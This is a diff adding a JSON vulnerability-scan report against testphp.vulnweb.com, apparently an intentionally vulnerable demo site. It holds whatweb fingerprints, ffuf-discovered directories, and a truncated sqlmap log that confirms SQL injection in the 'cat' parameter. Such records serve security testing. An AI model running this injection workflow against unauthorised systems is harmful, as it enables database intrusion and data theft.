@@ -1,0 +1,1321 @@
+{
+  "scan_info": {
+    "mode": "deep",
+    "target": "http://testphp.vulnweb.com/",
+    "generated_at": "2026-02-20 03:29:49",
+    "started_at": "2026-02-20 03:19:50",
+    "discovered_endpoints": 22,
+    "total_vulnerabilities": 1,
+    "severity_counts": {
+      "CRITICAL": 1,
+      "HIGH": 0,
+      "MEDIUM": 0,
+      "LOW": 0,
+      "INFO": 0
+    }
+  },
+  "discovered_endpoints": [
+    {
+      "tool": "whatweb",
+      "url": "http://testphp.vulnweb.com/",
+      "finding_name": "Technology Detected: ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000]",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "reconnaissance",
+      "description": "Detected technology: ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000]",
+      "timestamp": "2026-02-20 03:19:55",
+      "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]",
+      "type": "discovery",
+      "source": "whatweb"
+    },
+    {
+      "tool": "whatweb",
+      "url": "http://testphp.vulnweb.com/",
+      "finding_name": "Technology Detected: Adobe-Flash",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "reconnaissance",
+      "description": "Detected technology: Adobe-Flash",
+      "timestamp": "2026-02-20 03:19:55",
+      "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]",
+      "type": "discovery",
+      "source": "whatweb"
+    },
+    {
+      "tool": "whatweb",
+      "url": "http://testphp.vulnweb.com/",
+      "finding_name": "Technology Detected: Country[UNITED STATES][US]",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "reconnaissance",
+      "description": "Detected technology: Country[UNITED STATES][US]",
+      "timestamp": "2026-02-20 03:19:55",
+      "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]",
+      "type": "discovery",
+      "source": "whatweb"
+    },
+    {
+      "tool": "whatweb",
+      "url": "http://testphp.vulnweb.com/",
+      "finding_name": "Technology Detected: Email[wvs@acunetix.com]",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "reconnaissance",
+      "description": "Detected technology: Email[wvs@acunetix.com]",
+      "timestamp": "2026-02-20 03:19:55",
+      "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]",
+      "type": "discovery",
+      "source": "whatweb"
+    },
+    {
+      "tool": "whatweb",
+      "url": "http://testphp.vulnweb.com/",
+      "finding_name": "Technology Detected: HTTPServer[nginx/1.19.0]",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "reconnaissance",
+      "description": "Detected technology: HTTPServer[nginx/1.19.0]",
+      "timestamp": "2026-02-20 03:19:55",
+      "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]",
+      "type": "discovery",
+      "source": "whatweb"
+    },
+    {
+      "tool": "whatweb",
+      "url": "http://testphp.vulnweb.com/",
+      "finding_name": "Technology Detected: IP[44.228.249.3]",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "reconnaissance",
+      "description": "Detected technology: IP[44.228.249.3]",
+      "timestamp": "2026-02-20 03:19:55",
+      "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]",
+      "type": "discovery",
+      "source": "whatweb"
+    },
+    {
+      "tool": "whatweb",
+      "url": "http://testphp.vulnweb.com/",
+      "finding_name": "Technology Detected: Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000]",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "reconnaissance",
+      "description": "Detected technology: Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000]",
+      "timestamp": "2026-02-20 03:19:55",
+      "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]",
+      "type": "discovery",
+      "source": "whatweb"
+    },
+    {
+      "tool": "whatweb",
+      "url": "http://testphp.vulnweb.com/",
+      "finding_name": "Technology Detected: PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1]",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "reconnaissance",
+      "description": "Detected technology: PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1]",
+      "timestamp": "2026-02-20 03:19:55",
+      "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]",
+      "type": "discovery",
+      "source": "whatweb"
+    },
+    {
+      "tool": "whatweb",
+      "url": "http://testphp.vulnweb.com/",
+      "finding_name": "Technology Detected: Script[text/JavaScript]",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "reconnaissance",
+      "description": "Detected technology: Script[text/JavaScript]",
+      "timestamp": "2026-02-20 03:19:55",
+      "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]",
+      "type": "discovery",
+      "source": "whatweb"
+    },
+    {
+      "tool": "whatweb",
+      "url": "http://testphp.vulnweb.com/",
+      "finding_name": "Technology Detected: Title[Home of Acunetix Art]",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "reconnaissance",
+      "description": "Detected technology: Title[Home of Acunetix Art]",
+      "timestamp": "2026-02-20 03:19:55",
+      "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]",
+      "type": "discovery",
+      "source": "whatweb"
+    },
+    {
+      "tool": "whatweb",
+      "url": "http://testphp.vulnweb.com/",
+      "finding_name": "Technology Detected: X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1]",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "reconnaissance",
+      "description": "Detected technology: X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1]",
+      "timestamp": "2026-02-20 03:19:55",
+      "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]",
+      "type": "discovery",
+      "source": "whatweb"
+    },
+    {
+      "tool": "whatweb",
+      "url": "http://testphp.vulnweb.com/",
+      "finding_name": "Technology Detected: nginx[1.19.0]",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "reconnaissance",
+      "description": "Detected technology: nginx[1.19.0]",
+      "timestamp": "2026-02-20 03:19:55",
+      "raw_output": "http://testphp.vulnweb.com/ [200 OK] ActiveX[D27CDB6E-AE6D-11cf-96B8-444553540000], Adobe-Flash, Country[UNITED STATES][US], Email[wvs@acunetix.com], HTTPServer[nginx/1.19.0], IP[44.228.249.3], Object[http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0][clsid:D27CDB6E-AE6D-11cf-96B8-444553540000], PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1], Script[text/JavaScript], Title[Home of Acunetix Art], X-Powered-By[PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1], nginx[1.19.0]",
+      "type": "discovery",
+      "source": "whatweb"
+    },
+    {
+      "tool": "ffuf",
+      "url": "http://testphp.vulnweb.com/images",
+      "finding_name": "Hidden Resource Discovered",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "discovery",
+      "description": "Status: 301 | Size: 169",
+      "timestamp": "2026-02-20 03:22:50",
+      "raw_output": {
+        "input": {
+          "FFUFHASH": "677e010",
+          "FUZZ": "images"
+        },
+        "position": 16,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/images/",
+        "scraper": {},
+        "duration": 270502463,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/images",
+        "host": "testphp.vulnweb.com"
+      },
+      "type": "discovery",
+      "source": "ffuf",
+      "raw": {
+        "input": {
+          "FFUFHASH": "677e010",
+          "FUZZ": "images"
+        },
+        "position": 16,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/images/",
+        "scraper": {},
+        "duration": 270502463,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/images",
+        "host": "testphp.vulnweb.com"
+      }
+    },
+    {
+      "tool": "ffuf",
+      "url": "http://testphp.vulnweb.com/cgi-bin",
+      "finding_name": "Hidden Resource Discovered",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "discovery",
+      "description": "Status: 403 | Size: 276",
+      "timestamp": "2026-02-20 03:22:50",
+      "raw_output": {
+        "input": {
+          "FFUFHASH": "677e023",
+          "FUZZ": "cgi-bin"
+        },
+        "position": 35,
+        "status": 403,
+        "length": 276,
+        "words": 20,
+        "lines": 10,
+        "content-type": "text/html; charset=iso-8859-1",
+        "redirectlocation": "",
+        "scraper": {},
+        "duration": 273570740,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/cgi-bin",
+        "host": "testphp.vulnweb.com"
+      },
+      "type": "discovery",
+      "source": "ffuf",
+      "raw": {
+        "input": {
+          "FFUFHASH": "677e023",
+          "FUZZ": "cgi-bin"
+        },
+        "position": 35,
+        "status": 403,
+        "length": 276,
+        "words": 20,
+        "lines": 10,
+        "content-type": "text/html; charset=iso-8859-1",
+        "redirectlocation": "",
+        "scraper": {},
+        "duration": 273570740,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/cgi-bin",
+        "host": "testphp.vulnweb.com"
+      }
+    },
+    {
+      "tool": "ffuf",
+      "url": "http://testphp.vulnweb.com/admin",
+      "finding_name": "Hidden Resource Discovered",
+      "severity": "MEDIUM",
+      "risk_score": 5,
+      "category": "discovery",
+      "description": "Status: 301 | Size: 169",
+      "timestamp": "2026-02-20 03:22:50",
+      "raw_output": {
+        "input": {
+          "FFUFHASH": "677e0103",
+          "FUZZ": "admin"
+        },
+        "position": 259,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/admin/",
+        "scraper": {},
+        "duration": 266773883,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/admin",
+        "host": "testphp.vulnweb.com"
+      },
+      "type": "discovery",
+      "source": "ffuf",
+      "raw": {
+        "input": {
+          "FFUFHASH": "677e0103",
+          "FUZZ": "admin"
+        },
+        "position": 259,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/admin/",
+        "scraper": {},
+        "duration": 266773883,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/admin",
+        "host": "testphp.vulnweb.com"
+      }
+    },
+    {
+      "tool": "ffuf",
+      "url": "http://testphp.vulnweb.com/pictures",
+      "finding_name": "Hidden Resource Discovered",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "discovery",
+      "description": "Status: 301 | Size: 169",
+      "timestamp": "2026-02-20 03:22:50",
+      "raw_output": {
+        "input": {
+          "FFUFHASH": "677e01d1",
+          "FUZZ": "pictures"
+        },
+        "position": 465,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/pictures/",
+        "scraper": {},
+        "duration": 271980254,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/pictures",
+        "host": "testphp.vulnweb.com"
+      },
+      "type": "discovery",
+      "source": "ffuf",
+      "raw": {
+        "input": {
+          "FFUFHASH": "677e01d1",
+          "FUZZ": "pictures"
+        },
+        "position": 465,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/pictures/",
+        "scraper": {},
+        "duration": 271980254,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/pictures",
+        "host": "testphp.vulnweb.com"
+      }
+    },
+    {
+      "tool": "ffuf",
+      "url": "http://testphp.vulnweb.com/vendor",
+      "finding_name": "Hidden Resource Discovered",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "discovery",
+      "description": "Status: 301 | Size: 169",
+      "timestamp": "2026-02-20 03:22:50",
+      "raw_output": {
+        "input": {
+          "FFUFHASH": "677e05c9",
+          "FUZZ": "vendor"
+        },
+        "position": 1481,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/vendor/",
+        "scraper": {},
+        "duration": 268282064,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/vendor",
+        "host": "testphp.vulnweb.com"
+      },
+      "type": "discovery",
+      "source": "ffuf",
+      "raw": {
+        "input": {
+          "FFUFHASH": "677e05c9",
+          "FUZZ": "vendor"
+        },
+        "position": 1481,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/vendor/",
+        "scraper": {},
+        "duration": 268282064,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/vendor",
+        "host": "testphp.vulnweb.com"
+      }
+    },
+    {
+      "tool": "ffuf",
+      "url": "http://testphp.vulnweb.com/Templates",
+      "finding_name": "Hidden Resource Discovered",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "discovery",
+      "description": "Status: 301 | Size: 169",
+      "timestamp": "2026-02-20 03:22:50",
+      "raw_output": {
+        "input": {
+          "FFUFHASH": "677e08e7",
+          "FUZZ": "Templates"
+        },
+        "position": 2279,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/Templates/",
+        "scraper": {},
+        "duration": 265450524,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/Templates",
+        "host": "testphp.vulnweb.com"
+      },
+      "type": "discovery",
+      "source": "ffuf",
+      "raw": {
+        "input": {
+          "FFUFHASH": "677e08e7",
+          "FUZZ": "Templates"
+        },
+        "position": 2279,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/Templates/",
+        "scraper": {},
+        "duration": 265450524,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/Templates",
+        "host": "testphp.vulnweb.com"
+      }
+    },
+    {
+      "tool": "ffuf",
+      "url": "http://testphp.vulnweb.com/Flash",
+      "finding_name": "Hidden Resource Discovered",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "discovery",
+      "description": "Status: 301 | Size: 169",
+      "timestamp": "2026-02-20 03:22:50",
+      "raw_output": {
+        "input": {
+          "FFUFHASH": "677e0f89",
+          "FUZZ": "Flash"
+        },
+        "position": 3977,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/Flash/",
+        "scraper": {},
+        "duration": 274558697,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/Flash",
+        "host": "testphp.vulnweb.com"
+      },
+      "type": "discovery",
+      "source": "ffuf",
+      "raw": {
+        "input": {
+          "FFUFHASH": "677e0f89",
+          "FUZZ": "Flash"
+        },
+        "position": 3977,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/Flash/",
+        "scraper": {},
+        "duration": 274558697,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/Flash",
+        "host": "testphp.vulnweb.com"
+      }
+    },
+    {
+      "tool": "ffuf",
+      "url": "http://testphp.vulnweb.com/CVS",
+      "finding_name": "Hidden Resource Discovered",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "discovery",
+      "description": "Status: 301 | Size: 169",
+      "timestamp": "2026-02-20 03:22:50",
+      "raw_output": {
+        "input": {
+          "FFUFHASH": "677e01875",
+          "FUZZ": "CVS"
+        },
+        "position": 6261,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/CVS/",
+        "scraper": {},
+        "duration": 273123383,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/CVS",
+        "host": "testphp.vulnweb.com"
+      },
+      "type": "discovery",
+      "source": "ffuf",
+      "raw": {
+        "input": {
+          "FFUFHASH": "677e01875",
+          "FUZZ": "CVS"
+        },
+        "position": 6261,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/CVS/",
+        "scraper": {},
+        "duration": 273123383,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/CVS",
+        "host": "testphp.vulnweb.com"
+      }
+    },
+    {
+      "tool": "ffuf",
+      "url": "http://testphp.vulnweb.com/AJAX",
+      "finding_name": "Hidden Resource Discovered",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "discovery",
+      "description": "Status: 301 | Size: 169",
+      "timestamp": "2026-02-20 03:22:50",
+      "raw_output": {
+        "input": {
+          "FFUFHASH": "677e020dc",
+          "FUZZ": "AJAX"
+        },
+        "position": 8412,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/AJAX/",
+        "scraper": {},
+        "duration": 267236733,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/AJAX",
+        "host": "testphp.vulnweb.com"
+      },
+      "type": "discovery",
+      "source": "ffuf",
+      "raw": {
+        "input": {
+          "FFUFHASH": "677e020dc",
+          "FUZZ": "AJAX"
+        },
+        "position": 8412,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/AJAX/",
+        "scraper": {},
+        "duration": 267236733,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/AJAX",
+        "host": "testphp.vulnweb.com"
+      }
+    },
+    {
+      "tool": "ffuf",
+      "url": "http://testphp.vulnweb.com/secured",
+      "finding_name": "Hidden Resource Discovered",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "discovery",
+      "description": "Status: 301 | Size: 169",
+      "timestamp": "2026-02-20 03:22:50",
+      "raw_output": {
+        "input": {
+          "FFUFHASH": "677e038c1",
+          "FUZZ": "secured"
+        },
+        "position": 14529,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/secured/",
+        "scraper": {},
+        "duration": 275715090,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/secured",
+        "host": "testphp.vulnweb.com"
+      },
+      "type": "discovery",
+      "source": "ffuf",
+      "raw": {
+        "input": {
+          "FFUFHASH": "677e038c1",
+          "FUZZ": "secured"
+        },
+        "position": 14529,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/secured/",
+        "scraper": {},
+        "duration": 275715090,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/secured",
+        "host": "testphp.vulnweb.com"
+      }
+    }
+  ],
+  "vulnerabilities": [
+    {
+      "tool": "sqlmap",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=4",
+      "finding_name": "SQL Injection Confirmed",
+      "severity": "CRITICAL",
+      "risk_score": 10,
+      "category": "general",
+      "description": "Vulnerable Parameter: cat | Backend DBMS: MySQL >= 5.6 | Tested Parameters: cat | HTTP Method: GET | Revalidation: passed | SQLMap confirmed injectable parameter.",
+      "timestamp": "2026-02-20 03:29:28",
+      "raw_output": "___\n       __H__\n ___ ___[']_____ ___ ___  {1.9.11#stable}\n|_ -| . [']     | .'| . |\n|___|_  [']_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 03:28:01 /2026-02-20/\n\n[03:28:01] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36' from file '/usr/share/sqlmap/data/txt/user-agents.txt'\n[03:28:02] [INFO] flushing session file\n[03:28:02] [INFO] testing connection to the target URL\n[03:28:02] [INFO] checking if the target is protected by some kind of WAF/IPS\n[03:28:02] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS\nare you sure that you want to continue with further target testing? [Y/n] Y\n[03:28:02] [WARNING] please consider usage of tamper scripts (option '--tamper')\n[03:28:02] [INFO] testing if the target URL content is stable\n[03:28:03] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'\nhow do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C\n[03:28:03] [INFO] searching for dynamic content\n[03:28:03] [CRITICAL] target URL content appears to be heavily dynamic. sqlmap is going to retry the request(s)\n[03:28:05] [INFO] testing if GET parameter 'cat' is dynamic\n[03:28:05] [WARNING] GET parameter 'cat' does not appear to be dynamic\n[03:28:05] [INFO] testing for SQL injection on GET parameter 'cat'\nit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y\nfor the remaining tests, do you want to include all tests for 'MySQL' extending provided level (2) and risk (2) values? [Y/n] Y\n[03:28:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[03:28:06] [WARNING] reflective value(s) found and filtering out\n[03:28:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'\n[03:28:19] [INFO] GET parameter 'cat' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable \n[03:28:19] [INFO] testing 'Generic inline queries'\n[03:28:19] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'\n[03:28:19] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'\n[03:28:20] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'\n[03:28:20] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'\n[03:28:20] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'\n[03:28:21] [INFO] GET parameter 'cat' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable \n[03:28:21] [INFO] testing 'MySQL inline queries'\n[03:28:21] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'\n[03:28:21] [INFO] testing 'MySQL >= 5.0.12 stacked queries'\n[03:28:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'\n[03:28:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'\n[03:28:23] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'\n[03:28:23] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'\n[03:28:23] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'\n[03:28:35] [INFO] GET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable \n[03:28:35] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'\n[03:28:35] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found\n[03:28:42] [INFO] target URL appears to be UNION injectable with 11 columns\n[03:28:44] [INFO] GET parameter 